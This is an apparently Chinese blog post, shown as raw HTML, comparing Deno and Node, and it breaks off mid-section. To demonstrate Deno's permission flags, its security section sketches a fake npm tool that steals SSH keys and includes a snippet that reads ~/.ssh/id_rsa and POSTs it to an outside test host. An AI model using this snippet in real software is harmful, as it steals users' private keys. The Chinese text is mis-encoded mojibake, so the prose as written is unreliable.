
<!DOCTYPE html>
<html lang="zh-Hans" class="loading">
<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>äº†è§£xiadenoï¼Œä¸nodeçš„åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿ - é»˜é»˜é»˜é»˜ç‡ƒ</title>
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="google" content="notranslate" />
    <meta name="keywords" content="TriDiamond Obsidian,"> 
    <meta name="description" content="ä¸€æšå‰ç«¯æ¬ç –é˜Ÿé˜Ÿå‘˜çš„è®°å½•å†Œ,Deno VS Node


ä¸åŒç‚¹
Node
Deno




API å¼•ç”¨æ–¹å¼
æ¨¡å—å¯¼å…¥
å…¨å±€å¯¹è±¡


æ¨¡å—ç³»ç»Ÿ
CommonJS &amp;amp; æ–°ç‰ˆ node å®éªŒæ€§ ES Module
ES ,"> 
    <meta name="author" content="å¼ ç™½å‘Šä¸¶"> 
    <link rel="alternative" href="atom.xml" title="é»˜é»˜é»˜é»˜ç‡ƒ" type="application/atom+xml"> 
    <link rel="icon" href="/img/favicon.png"> 
    <link href="https://fonts.loli.net/css?family=Roboto+Mono|Rubik&display=swap" rel="stylesheet">
    
<link rel="stylesheet" href="//at.alicdn.com/t/font_1429596_nzgqgvnmkjb.css">

    
<link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.7.2/animate.min.css">

    
<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">

    
<link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/codemirror.min.css">

    
<link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/theme/dracula.css">

    
<link rel="stylesheet" href="/css/obsidian.css">

    
<link rel="stylesheet" href="/css/ball-atom.min.css">

<meta name="generator" content="Hexo 4.2.0"></head>


<body class="loading">
    <div class="loader">
        <div class="la-ball-atom la-2x">
            <div></div>
            <div></div>
            <div></div>
            <div></div>
        </div>
    </div>
    <span id="config-title" style="display:none">é»˜é»˜é»˜é»˜ç‡ƒ</span>
    <div id="loader"></div>
    <div id="single">
    <div class="scrollbar gradient-bg-rev"></div>
<div id="top" style="display: block;">
    <div class="bar" style="width: 0;"></div>
    <div class="navigation animated fadeIn fast delay-1s">
        <img id="home-icon" class="icon-home" src="/img/favicon.png" alt="" data-url="https://zhanghao-web.github.io">
        <div id="play-icon" title="Play/Pause" class="iconfont icon-play"></div>
        <h3 class="subtitle">äº†è§£xiadenoï¼Œä¸nodeçš„åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿ</h3>
        <div class="social">
            <!--        <div class="like-icon">-->
            <!--            <a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
            <!--        </div>-->
            <div>
                <div class="share">
                    
                        <a href="javascript:;" class="iconfont icon-share1"></a>
                        <div class="share-component-cc" data-disabled="facebook,douban,linkedin,diandian,tencent,google"></div>
                    
                </div>
            </div>
        </div>
    </div>
</div>

    <div class="section">
        <div class=article-header-wrapper>
    <div class="article-header">
        <div class="article-cover animated fadeIn" style="
            animation-delay: 600ms;
            animation-duration: 1.2s;
            background-image: 
                radial-gradient(ellipse closest-side, rgba(0, 0, 0, 0.65), #100e17),
                url(/img/cover.jpg) ">
        </div>
        <div class="else">
            <p class="animated fadeInDown">
                
                <a href="/categories/Deno"><b>ã€Œ
                    </b>DENO<b> ã€</b></a>
                
                May 17, 2020
            </p>
            <h3 class="post-title animated fadeInDown"><a href="/2020/05/17/Deno/%E4%BA%86%E8%A7%A3%E4%B8%8Bdeno%EF%BC%8C%E4%B8%8Enode%E7%9A%84%E5%8C%BA%E5%88%AB%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F/" title="äº†è§£xiadenoï¼Œä¸nodeçš„åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿ" class="">äº†è§£xiadenoï¼Œä¸nodeçš„åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿ</a>
            </h3>
            
            <p class="post-count animated fadeInDown">
                
                <span>
                    <b class="iconfont icon-text2"></b> <i>Words count</i>
                    15k
                </span>
                
                
                <span>
                    <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
                    13 mins.
                </span>
                
                
                
                <span id="busuanzi_container_page_pv">
                    <b class="iconfont icon-read"></b> <i>Read count</i>
                    <span id="busuanzi_value_page_pv">0</span>
                </span>
                
            </p>
            
            
            <ul class="animated fadeInDown post-tags-list" itemprop="keywords"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/Deno/" rel="tag">Deno</a></li></ul>
            
        </div>
    </div>
</div>

<div class="screen-gradient-after">
    <div class="screen-gradient-content">
        <div class="screen-gradient-content-inside">
            <div class="bold-underline-links screen-gradient-sponsor">
                <p>
                    <span class="animated fadeIn delay-1s"></span>
                </p>
            </div>
        </div>
    </div>
</div>

<div class="article">
    <div class='main'>
        <div class="content markdown animated fadeIn">
            <h1 id="Deno-VS-Node"><a href="#Deno-VS-Node" class="headerlink" title="Deno VS Node"></a>Deno VS Node</h1><table>
<thead>
<tr>
<th>ä¸åŒç‚¹</th>
<th style="text-align:right">Node</th>
<th style="text-align:center">Deno</th>
</tr>
</thead>
<tbody>
<tr>
<td>API å¼•ç”¨æ–¹å¼</td>
<td style="text-align:right">æ¨¡å—å¯¼å…¥</td>
<td style="text-align:center">å…¨å±€å¯¹è±¡</td>
</tr>
<tr>
<td>æ¨¡å—ç³»ç»Ÿ</td>
<td style="text-align:right">CommonJS &amp; æ–°ç‰ˆ node å®éªŒæ€§ ES Module</td>
<td style="text-align:center">ES Module æµè§ˆå™¨å®ç°</td>
</tr>
<tr>
<td>å®‰å…¨</td>
<td style="text-align:right">æ— å®‰å…¨é™åˆ¶</td>
<td style="text-align:center">é»˜è®¤å®‰å…¨</td>
</tr>
<tr>
<td>Typescript</td>
<td style="text-align:right">ç¬¬ä¸‰æ–¹ï¼Œå¦‚é€šè¿‡ ts-node æ”¯æŒ</td>
<td style="text-align:center">åŸç”Ÿæ”¯æŒ</td>
</tr>
<tr>
<td>åŒ…ç®¡ç†</td>
<td style="text-align:right">npm + node_modules</td>
<td style="text-align:center">åŸç”Ÿæ”¯æŒ</td>
</tr>
<tr>
<td>å¼‚æ­¥æ“ä½œ</td>
<td style="text-align:right">å›è°ƒ</td>
<td style="text-align:center">Promise</td>
</tr>
<tr>
<td>åŒ…åˆ†å‘</td>
<td style="text-align:right">ä¸­å¿ƒåŒ– npmjs.com</td>
<td style="text-align:center">å»ä¸­å¿ƒåŒ– import url</td>
</tr>
<tr>
<td>å…¥å£</td>
<td style="text-align:right">package.json é…ç½®</td>
<td style="text-align:center">import url ç›´æ¥å¼•å…¥</td>
</tr>
<tr>
<td>æ‰“åŒ…ã€æµ‹è¯•ã€æ ¼å¼åŒ–</td>
<td style="text-align:right">ç¬¬ä¸‰æ–¹å¦‚ eslintã€gulpã€webpackã€babel ç­‰</td>
<td style="text-align:center">åŸç”Ÿæ”¯æŒ</td>
</tr>
</tbody>
</table>
<h2 id="1-å†…ç½®-API-å¼•ç”¨æ–¹å¼ä¸åŒ"><a href="#1-å†…ç½®-API-å¼•ç”¨æ–¹å¼ä¸åŒ" class="headerlink" title="1.å†…ç½® API å¼•ç”¨æ–¹å¼ä¸åŒ"></a>1.å†…ç½® API å¼•ç”¨æ–¹å¼ä¸åŒ</h2><p><strong>node æ¨¡å—å¯¼å…¥</strong></p>
<p>node å†…ç½® API é€šè¿‡æ¨¡å—å¯¼å…¥çš„æ–¹å¼å¼•ç”¨ï¼Œä¾‹å¦‚ï¼š</p>
<pre><code class="js">const fs = require(&quot;fs&quot;);
fs.readFileSync(&quot;./data.txt&quot;);
</code></pre>
<p><strong>deno å…¨å±€å¯¹è±¡</strong></p>
<p>è€Œ deno åˆ™æ˜¯ä¸€ä¸ªå…¨å±€å¯¹è±¡ Deno çš„å±æ€§å’Œæ–¹æ³•ï¼š</p>
<pre><code class="js">Deno.readFileSync(&quot;./data.txt&quot;);
å…·ä½“ deno æœ‰å“ªäº›æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ repl çœ‹ä¸€ä¸‹ï¼š
</code></pre>
<pre><code class="js">deno # æˆ– deno repl
</code></pre>
<p>è¿›å…¥ <code>repl</code> åï¼Œè¾“å…¥ Deno å›è½¦ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼š</p>
<pre><code class="json">{
 Buffer: [Function: Buffer],
 readAll: [AsyncFunction: readAll],
 readAllSync: [Function: readAllSync],
 writeAll: [AsyncFunction: writeAll],
 writeAllSync: [Function: writeAllSync],
 # .....
}
</code></pre>
<p>è¿™ç§å¤„ç†çš„æ–¹å¼å¥½å¤„æ˜¯<strong>ç®€å•ã€æ–¹ä¾¿</strong>ï¼Œåå¤„æ˜¯<strong>æ²¡æœ‰åˆ†ç±»</strong>ï¼Œæƒ³æŸ¥æ‰¾å¿˜è®°çš„ API æ¯”è¾ƒå›°éš¾ã€‚æ€»ä½“æ¥è¯´è§ä»è§æ™ºã€‚</p>
<h2 id="2-æ¨¡å—ç³»ç»Ÿ"><a href="#2-æ¨¡å—ç³»ç»Ÿ" class="headerlink" title="2.æ¨¡å—ç³»ç»Ÿ"></a>2.æ¨¡å—ç³»ç»Ÿ</h2><p>æˆ‘ä»¬å†æ¥çœ‹ä¸€ä¸‹æ¨¡å—ç³»ç»Ÿï¼Œè¿™ä¹Ÿæ˜¯ deno å’Œ node <strong>å·®åˆ«æœ€å¤§çš„åœ°æ–¹</strong>ï¼ŒåŒæ ·ä¹Ÿæ˜¯ deno å’Œ node ä¸å…¼å®¹çš„åœ°æ–¹ã€‚</p>
<p><strong>node CommonJS è§„èŒƒ</strong><br>æˆ‘ä»¬éƒ½çŸ¥é“ node é‡‡ç”¨çš„æ˜¯ CommonJS è§„èŒƒï¼Œè€Œ deno åˆ™æ˜¯é‡‡ç”¨çš„ ES Module çš„æµè§ˆå™¨å®ç°ï¼Œé‚£ä¹ˆæˆ‘ä»¬é¦–å…ˆæ¥è®¤è¯†ä¸€ä¸‹ï¼š</p>
<p><strong>ES Module çš„æµè§ˆå™¨å®ç°</strong><br>å…·ä½“å…³äº ES Module æƒ³å¿…å¤§å®¶éƒ½æ—©å·²ç†ŸçŸ¥ï¼Œä½†å…¶æµè§ˆå™¨å®ç°å¯èƒ½å¤§å®¶è¿˜ä¸æ˜¯å¾ˆç†Ÿæ‚‰ï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆçœ‹ä¸€ä¸‹å…¶æµè§ˆå™¨å®ç°ï¼š</p>
<pre><code class="html">&lt;body&gt;
  &lt;!-- æ³¨æ„è¿™é‡Œä¸€å®šè¦åŠ ä¸Š type=&quot;module&quot; --&gt;
  &lt;script type=&quot;module&quot;&gt;
    // ä» URL å¯¼å…¥
    import Vue from &quot;https://unpkg.com/vue@2.6.11/dist/vue.esm.browser.js&quot;;
    // ä»ç›¸å¯¹è·¯å¾„å¯¼å…¥
    import * as utils from &quot;./utils.js&quot;;
    // ä»ç»å¯¹è·¯å¾„å¯¼å…¥
    import &quot;/index.js&quot;;

    // ä¸æ”¯æŒ
    import foo from &quot;foo.js&quot;;
    import bar from &quot;bar/index.js&quot;;
    import zoo from &quot;./index&quot;; // æ²¡æœ‰ .js åç¼€
  &lt;/script&gt;
&lt;/body&gt;
</code></pre>
<p><strong>deno çš„æ¨¡å—è§„èŒƒ</strong><br>deno å®Œå…¨éµå¾ª es module æµè§ˆå™¨å®ç°ï¼Œæ‰€ä»¥ deno ä¹Ÿæ˜¯å¦‚æ­¤ï¼š</p>
<pre><code class="js">// æ”¯æŒ
import * as fs from &quot;https://deno.land/std/fs/mod.ts&quot;;
import { deepCopy } from &quot;./deepCopy.js&quot;;
import foo from &quot;/foo.ts&quot;;

// ä¸æ”¯æŒ
import foo from &quot;foo.ts&quot;;
import bar from &quot;./bar&quot;; // å¿…é¡»æŒ‡å®šæ‰©å±•å\
</code></pre>
<p>æˆ‘ä»¬å‘ç°å…¶å’Œæˆ‘ä»¬å¹³å¸¸åœ¨ webpack æˆ–è€… ts ä½¿ç”¨ es module æœ€å¤§çš„ä¸åŒï¼š</p>
<ul>
<li><p>å¯ä»¥é€šè¿‡ import url ç›´æ¥å¼•ç”¨çº¿ä¸Šèµ„æºï¼›</p>
</li>
<li><p>èµ„æºä¸å¯çœç•¥æ‰©å±•åå’Œæ–‡ä»¶åã€‚</p>
</li>
</ul>
<p>å…³äºç¬¬ 1 ç‚¹ï¼Œäº‰è®®éå¸¸å¤§ï¼Œæœ‰äººå¾ˆçœ‹å¥½ï¼Œè§‰å¾—æå¤§çš„æ‰©å±•äº† deno åº“çš„èŒƒå›´ï¼›æœ‰äººåˆ™ä¸å¤ªçœ‹å¥½ï¼Œè§‰å¾—å›½å†…ç½‘é€Ÿçš„åŸå› ï¼Œå¹¶ä¸å®ç”¨ã€‚</p>
<h2 id="3-å®‰å…¨"><a href="#3-å®‰å…¨" class="headerlink" title="3.å®‰å…¨"></a>3.å®‰å…¨</h2><p>å¦‚æœæ¨¡å—è§„èŒƒæ˜¯ node å’Œ deno æœ€å¤§çš„ä¸åŒï¼Œé‚£ä¹ˆå¯¹å®‰å…¨çš„å¤„ç†ï¼Œåˆ™æ˜¯å¦å¤–ä¸€ä¸ªè®©äººæ‘¸ä¸ç€å¤´è„‘çš„åœ°æ–¹ã€‚</p>
<p><strong>æ¨¡æ‹Ÿç›—å·</strong></p>
<p>åœ¨ä»‹ç»ä¹‹å‰æˆ‘ä»¬å…ˆæ€è€ƒä¸€ä¸‹è¿™ä¸ªåœºæ™¯ä¼šä¸ä¼šå‡ºç°ï¼š</p>
<p>æˆ‘åšäº†ä¸€ä¸ªåŸºäºå‘½ä»¤è¡Œçš„ä¸€é”®ä¸Šç½‘å·¥å…· <code>breakwall</code>ï¼Œæ¯æœˆ 1 ä¸ª G å…è´¹æµé‡ï¼Œç„¶åå°†å‹ç¼©åçš„ JS ä»£ç å‘å¸ƒåˆ° npm ä¸Šï¼Œç„¶åååœ¨å„ç§æ¸ é“å®£ä¼ ä¸€æ³¢ã€‚</p>
<p>ç¾Šæ¯›å…šå…´é«˜å½©çƒˆçš„ <code>cnpm install -g breakwall</code>ï¼Œç„¶åæ¯æ¬¡ä½¿ç”¨çš„æ—¶å€™ï¼Œæˆ‘å·å·çš„å°†è¯¸ä½çš„ ssh å¯†é’¥å’Œå„ç§èƒ½å·çš„æ–‡æ¡£åŠå›¾ç‰‡å·å·ä¸Šä¼ åˆ°æˆ‘çš„æœåŠ¡å™¨ï¼Œåœ¨è®¾å®šæœŸé™åˆ°æœŸåï¼Œåˆ é™¤ç”µè„‘ä¸Šèµ„æ–™ï¼Œç•™ä¸‹ä¸€å¥æ‹¿é’±æ¢èµ„æ–™ï¼Œä»…æ”¯æŒæ¯”ç‰¹å¸ã€‚</p>
<p><strong>é»˜è®¤å®‰å…¨çš„ deno</strong></p>
<p>å¦‚æœä½ è§‰å¾—ä»¥ä¸Šæƒ…å†µæœ‰å¯èƒ½å‡ºç°ï¼Œåˆ™ä¼šè§‰å¾—ä¸‹é¢çš„åŠŸèƒ½å¾ˆå®ç”¨ã€‚æˆ‘ä»¬å…ˆç”¨ deno æ‰§è¡Œä»¥ä¸‹ä»£ç ï¼š</p>
<pre><code class="js">// index.js
let rsa = Deno.readFileSync(Deno.dir(&quot;home&quot;) + &quot;/.ssh/id_rsa&quot;);

rsa = new TextDecoder().decode(rsa);

fetch(&quot;http://jsonplaceholder.typicode.com/posts/1&quot;, {
  method: &quot;POST&quot;,
  body: JSON.stringify(rsa)
})
  .then((res) =&gt; res.json())
  .then((res) =&gt; console.log(&quot;å¯†é’¥å‘é€æˆåŠŸï¼Œå˜¿å˜¿å˜¿ğŸ˜œ&quot;));

console.log(&quot;start breakwall...&quot;);
</code></pre>
<blockquote>
<p>PS: â€“unstable æ˜¯ç”±äº Deno.dir API ä¸ç¨³å®š</p>
</blockquote>
<pre><code class="js"> deno run --unstable index.js
</code></pre>
<p>æˆ‘ä»¬å°†ä¼šå¾—åˆ°å¦‚ä¸‹æŠ¥é”™ä¿¡æ¯ï¼š</p>
<pre><code class="js">&gt; deno run --unstable  index.js
error: Uncaught PermissionDenied: access to environment variables, run again with the --allow-env flag
    ...
</code></pre>
<p>æ„æ€å°±æ˜¯æƒé™å¼‚å¸¸ï¼Œéœ€è¦è®¿é—®ç¯å¢ƒå˜é‡ï¼Œéœ€è¦åŠ ä¸Š <code>--allow-env</code>ï¼Œæˆ‘ä»¬åŠ ä¸Šè¿™ä¸ªå‚æ•°å†è¯•ä¸€ä¸‹ã€‚</p>
<pre><code class="js"> deno run --unstable --allow-env index.js
error: Uncaught PermissionDenied: read access to &quot;/Users/zhangchaojie/.ssh/id_rsa&quot;, run again with the --allow-read flag
    ...
</code></pre>
<p>å¦‚æ­¤åå¤ï¼Œè¿˜éœ€åŠ ä¸Š <code>--allow-read</code>ã€<code>--allow-net</code> ï¼Œæœ€ç»ˆçš„ç»“æœæ˜¯ï¼š</p>
<pre><code class="js">&gt; deno run --unstable --allow-env --allow-read --allow-net  index.js
start breakwall...
å¯†é’¥å‘é€æˆåŠŸï¼Œå˜¿å˜¿å˜¿ğŸ˜œ
</code></pre>
<p>ç»è¿‡ä¸€ç•ªæŠ˜è…¾ï¼Œæ€»ç®—æ˜¯å‘é€æˆåŠŸäº†ï¼Œè¦æƒ³ç›—å–å¯†é’¥å®å±ä¸æ˜“ã€‚</p>
<p><strong>ç™½åå•</strong></p>
<p>é‚£æœ‰äººå°±è¯´äº†ï¼Œå¦‚æœæˆ‘çš„åº”ç”¨ç¡®å®éœ€è¦è®¿é—®ç½‘ç»œå’Œæ–‡ä»¶ï¼Œä½†æ˜¯æœ‰ä¸æƒ³è®©å®ƒè®¿é—® .ssh æ–‡ä»¶æœ‰æ²¡æœ‰åŠæ³•ï¼Ÿ</p>
<p>å½“ç„¶æœ‰äº†ï¼Œæˆ‘ä»¬å¯ä»¥ç»™ <code>--allow-read</code> å’Œ <code>--allow-net</code> æŒ‡å®šç™½åå•ï¼Œåå•ä¹‹å¤–éƒ½ä¸å¯è®¿é—®ï¼Œä¾‹å¦‚ï¼š</p>
<pre><code class="js">&gt; deno run --unstable --allow-env --allow-read --allow-net=https://www.baidu.com  index.js
start breakwall...
error: Uncaught PermissionDenied: network access to &quot;http://jsonplaceholder.typicode.com/posts/1&quot;, run again with the --allow-net flag
    at unwrapResponse ($deno$/ops/dispatch_json.ts:43:11)
    at Object.sendAsync ($deno$/ops/dispatch_json.ts:98:10)
    at async fetch ($deno$/web/fetch.ts:591:27)
</code></pre>
<p><strong>ç®€åŒ–å‚æ•°</strong></p>
<p>å¦‚æœç¡®è®¤æ˜¯æ²¡é—®é¢˜ï¼Œæˆ–è€…æ˜¯è‡ªå·±å¼€å‘è½¯ä»¶æ—¶ï¼Œå›¾ä¸ªæ–¹ä¾¿ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ -A æˆ– â€“allow-all å‚æ•°å…è®¸æ‰€æœ‰æƒé™ï¼š</p>
<pre><code class="js">&gt; deno -A --unstable index.js
start breakwall...
å¯†é’¥å‘é€æˆåŠŸï¼Œå˜¿å˜¿å˜¿ğŸ˜œ
</code></pre>
<p>å®‰å…¨è¿™æ–¹é¢è§ä»è§æ™ºï¼Œæœ‰äººè§‰å¾—æ˜¯å¤šä½™ï¼Œæœ‰äººè§‰å¾—å¾ˆå¥½ç”¨ï¼Œæå¤§çš„å¢å¼ºäº†å®‰å…¨æ€§ã€‚å¦‚æœä½ å±äºè§‰å¾—è¿™ä¸ªåŠŸèƒ½å¤šä½™çš„ï¼Œå¯ä»¥ deno run -A xxx å³å¯ã€‚</p>
<h2 id="4-å…¼å®¹æµè§ˆå™¨-API"><a href="#4-å…¼å®¹æµè§ˆå™¨-API" class="headerlink" title="4.å…¼å®¹æµè§ˆå™¨ API"></a>4.å…¼å®¹æµè§ˆå™¨ API</h2><p>å…³äºä¸ºä»€ä¹ˆï¼Œæˆ‘ä¸¾ä¸ªæ —å­å¤§å®¶å°±æ˜ç™½äº†ï¼šåœ¨è®¾è®¡ node ä¹‹å¤„ï¼Œå…³äºè¾“å‡ºå‡½æ•°æœ¬æ¥å« <code>print</code> ä¹‹ç±»çš„ï¼Œåæ¥æœ‰äººæè®®ä¸ºä»€ä¹ˆä¸å« <code>console.log</code>ï¼Œry è§‰å¾—æŒºä¸é”™ï¼Œäºæ˜¯å°±æ¥çº³äº†æ„è§ã€‚</p>
<p>ä½†æ˜¯ï¼Œè¿™ä¸ªè®¾è®¡å¹¶ä¸æ˜¯åˆ»æ„ä¸ºä¹‹ï¼Œè€Œ deno çš„è®¾è®¡åˆ™å¯ä»¥ä¸ºä¹‹ï¼Œé€šè¿‡ä¸æµè§ˆå™¨ API ä¿æŒä¸€è‡´ï¼Œæ¥å‡å°‘å¤§å®¶çš„è®¤çŸ¥ã€‚</p>
<p><strong>æ€ä¹ˆå…¼å®¹æµè§ˆå™¨ API</strong></p>
<blockquote>
<p>æ¦‚å¿µä¸Šå…¼å®¹</p>
<ul>
<li>æ¨¡å—ç³»ç»Ÿï¼Œä»ä¸Šé¢ä»‹ç»çœ‹å‡º deno æ˜¯å®Œå…¨éµå¾ªæµè§ˆå™¨å®ç°çš„ï¼›</li>
</ul>
</blockquote>
<ul>
<li><p>é»˜è®¤å®‰å…¨ï¼Œå½“ç„¶ä¹Ÿä¸æ˜¯è‡ªå·±åˆ›é€ çš„æ¦‚å¿µï¼Œw3c æ—©å·²åšå‡ºæµè§ˆå™¨æƒé™çš„è§„å®šï¼Œæˆ‘ä»¬åœ¨åšå°ç¨‹åºçš„æ—¶å€™å°¤ä¸ºæ˜æ˜¾ï¼Œéœ€è¦è·å–å„ç§æƒé™ï¼›</p>
</li>
<li><p>å¯¹äºå¼‚æ­¥æ“ä½œè¿”å› Promiseï¼›</p>
</li>
<li><p>ä½¿ç”¨ <code>ArrayBuffer</code> å¤„ç†äºŒè¿›åˆ¶ï¼›</p>
</li>
</ul>
<blockquote>
<p>å­˜åœ¨ window å…¨å±€å˜é‡</p>
</blockquote>
<p><code>console.log(window === this, window === self, window === globalThis);</code></p>
<blockquote>
<p>å®ç°äº† WindowOrWorkerGlobalScope çš„å…¨éƒ¨æ–¹æ³•</p>
</blockquote>
<p>å…·ä½“æ–¹æ³•åˆ—è¡¨ï¼Œæˆ‘ä»¬å¯ä»¥å‚è€ƒï¼š<code>lib.deno.shared_globals.d.ts</code> å’Œ <code>lib.deno.window.d.ts</code></p>
<pre><code class="js">// è¯·æ±‚æ–¹æ³•
fetch(&quot;https://baidu.com&quot;);

// base64 è½¬åŒ–
let encodedData = btoa(&quot;Hello, world&quot;); // ç¼–ç 
let decodedData = atob(encodedData); // è§£ç 

// å¾®ä»»åŠ¡
queueMicrotask(() =&gt; {
  console.log(123);
});
</code></pre>
<blockquote>
<p>å¤§è¶‹åŠ¿</p>
</blockquote>
<p>æ€»ä½“è€Œè¨€ï¼Œå¦‚æœæœåŠ¡ç«¯å’Œæµè§ˆå™¨ç«¯å­˜åœ¨ç›¸åŒæ¦‚å¿µï¼Œdeno å°±ä¸ä¼šåˆ›é€ æ–°çš„æ¦‚å¿µã€‚è¿™ä¸€ç‚¹å…¶å® node ä¹Ÿåœ¨åšï¼Œæ–°çš„ node 14.0 CHANGELOG å°±ä¹ŸæåŠè¦å®ç° Universal JavaScript å’Œ Spec compliance and Web Compatibilityçš„æ€æƒ³ï¼Œæ‰€ä»¥è¿™ç‚¹å¤§å®¶åº”è¯¥éƒ½ä¼šæ¥å—å§ï¼Œæ¯•ç«Ÿå¤§åŠ¿æ‰€è¶‹è¶‹åŠ¿ã€‚</p>
<h2 id="5-æ”¯æŒ-Typescript"><a href="#5-æ”¯æŒ-Typescript" class="headerlink" title="5.æ”¯æŒ Typescript"></a>5.æ”¯æŒ Typescript</h2><p>ä¸ç®¡ä½ å–œæ¬¢ä¸å¦ï¼Œ2020 å¹´äº†ï¼Œå¿…é¡»å­¦ä¹  TS äº†ï¼ˆèµ·ç åœ¨é¢è¯•çš„æ—¶å€™æ˜¯äº®ç‚¹ï¼‰ã€‚å­¦å®Œä¹‹åä½ æ‰ä¼šæ˜ç™½ç‹å¢ƒæ³½å®šå¾‹çœŸçš„æ— å¤„ä¸åœ¨ã€‚</p>
<pre><code class="js">// index.ts
let str: string = &quot;ç‹å¢ƒæ³½å®šå¾‹&quot;;
str = 132;
&gt; deno run index.ts
error TS2322: Type &#39;123&#39; is not assignable to type &#39;string&#39;.

â–º file:///Users/zhangchaojie/Desktop/index.ts:2:1

2 str = 123
  ~~~
</code></pre>
<h2 id="6-å»-node-modules"><a href="#6-å»-node-modules" class="headerlink" title="6.å» node_modules"></a>6.å» node_modules</h2><p>deno æ²¡æœ‰ <code>node_modules</code>ï¼Œé‚£ä¹ˆå®ƒæ˜¯æ€ä¹ˆè¿›è¡ŒåŒ…ç®¡ç†çš„å‘¢ï¼Ÿæˆ‘ä»¬å…ˆçœ‹ä¸‹é¢çš„ä¾‹å­</p>
<pre><code class="js">// index.js
import { white, bgRed } from &quot;https://deno.land/std/fmt/colors.ts&quot;;

console.log(bgRed(white(&quot;hello world!&quot;)));
&gt; deno run index.js
Download https://deno.land/std/fmt/colors.ts
Compile https://deno.land/std/fmt/colors.ts
hello world!
</code></pre>
<p>æˆ‘ä»¬çœ‹åˆ°å…¶æœ‰ Download å’Œ Compile ä¸¤ä¸ªæ­¥éª¤ï¼Œæˆ‘ä»¬ä¼šäº§ç”Ÿå‡ ä¸ªç–‘é—®ï¼š</p>
<blockquote>
<p>1ã€æ¯æ¬¡æ‰§è¡Œéƒ½è¦ä¸‹è½½å—ï¼Ÿ</p>
</blockquote>
<p>è§£ï¼šæˆ‘ä»¬åªéœ€è¦å†æ‰§è¡Œä¸€æ¬¡å°±èƒ½æ˜ç™½ï¼Œä¸éœ€è¦æ¯æ¬¡ä¸‹è½½ã€‚</p>
<pre><code class="js">&gt; deno run index.js
hello world!
</code></pre>
<blockquote>
<p>2ã€Download å’Œ Compile çš„æ–‡ä»¶åœ¨å“ªé‡Œå‘¢ï¼Ÿ</p>
</blockquote>
<p>è§£ï¼šæˆ‘ä»¬ä¼šå‘ç°ï¼Œå½“å‰æ‰§è¡Œçš„ç›®å½•ï¼Œå¹¶æ²¡æœ‰ Download å’Œ Compile æ–‡ä»¶ï¼Œé‚£æ–‡ä»¶æ”¾åœ¨å“ªé‡Œå‘¢ï¼Œæˆ‘ä»¬é¦–å…ˆæ¥çœ‹ä¸€ä¸‹ deno â€“help å‘½ä»¤ï¼š</p>
<pre><code class="js">&gt; deno --help
SUBCOMMANDS:
# ...
info           Show info about cache or info related to source file

# ...
ENVIRONMENT VARIABLES:
    DENO_DIR   Set deno&#39;s base directory (defaults to $HOME/.deno)
</code></pre>
<p>deno info å‘½ä»¤å±•ç¤ºäº†ä¾èµ–å…³ç³»ï¼Œç±»ä¼¼ package.jsonã€‚</p>
<pre><code class="js">&gt; deno info index.js
local: /Users/zhangchaojie/Desktop/index.js
type: JavaScript
deps:
file:///Users/zhangchaojie/Desktop/index.js
  â””â”€â”€ https://deno.land/std/fmt/colors.ts
</code></pre>
<p>DENO_DIR åˆ™ä¸ºå®é™…çš„å®‰è£…å’Œç¼–è¯‘ç›®å½•ï¼Œç›¸å½“äº node_modulesï¼Œé»˜è®¤ä¸º $HOME/.denoï¼ˆå‘½ä»¤æç¤ºæ˜¯è¿™æ ·çš„ï¼Œä½†å®é™…éœ€è¦æŒ‡å®šä¸€ä¸‹ç¯å¢ƒå˜é‡ <code>export DENO_DIR=$HOME/.denoï¼‰</code>ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹ï¼š</p>
<pre><code class="js">&gt; tree $HOME/.deno
/Users/zhangchaojie/.deno
â”œâ”€â”€ deps
â”‚   â””â”€â”€ https
â”‚       â””â”€â”€ deno.land
â”‚           â”œâ”€â”€ 3574883d8acbaf00e28990ec8e83d71084c4c668c1dc7794be25208c60cfc935
â”‚           â””â”€â”€ 3574883d8acbaf00e28990ec8e83d71084c4c668c1dc7794be25208c60cfc935.metadata.json
â””â”€â”€ gen
    â””â”€â”€ https
        â””â”€â”€ deno.land
            â””â”€â”€ std
                â””â”€â”€ fmt
                    â”œâ”€â”€ colors.ts.js
                    â”œâ”€â”€ colors.ts.js.map
                    â””â”€â”€ colors.ts.meta

8 directories, 5 files
</code></pre>
<blockquote>
<p>3ã€æ²¡ç½‘ç»œäº†æ€ä¹ˆåŠï¼Ÿ</p>
</blockquote>
<p>æˆ‘ä»¬æœ‰äº›åœºæ™¯æ˜¯å°†æœ¬åœ°å†™å¥½çš„ä»£ç éƒ¨ç½²åˆ°æ²¡æœ‰ç½‘ç»œçš„æœåŠ¡å™¨ï¼Œé‚£ä¹ˆå½“æ‰§è¡Œ deno run xxx æ—¶ï¼Œå°±æ˜¯æç¤º error sending requestã€‚</p>
<p>è§£ï¼šå°†ä¸Šé¢çš„ç¼“å­˜ç›®å½•å†…å®¹ï¼Œç›´æ¥æ‹·è´åˆ°æœåŠ¡å™¨å¹¶æŒ‡å®šç¯å¢ƒå˜é‡åˆ°å…¶ç›®å½•å³å¯ã€‚</p>
<blockquote>
<p>4ã€ä¾èµ–ä»£ç æ›´æ–°äº†æ€ä¹ˆåŠï¼Ÿ</p>
</blockquote>
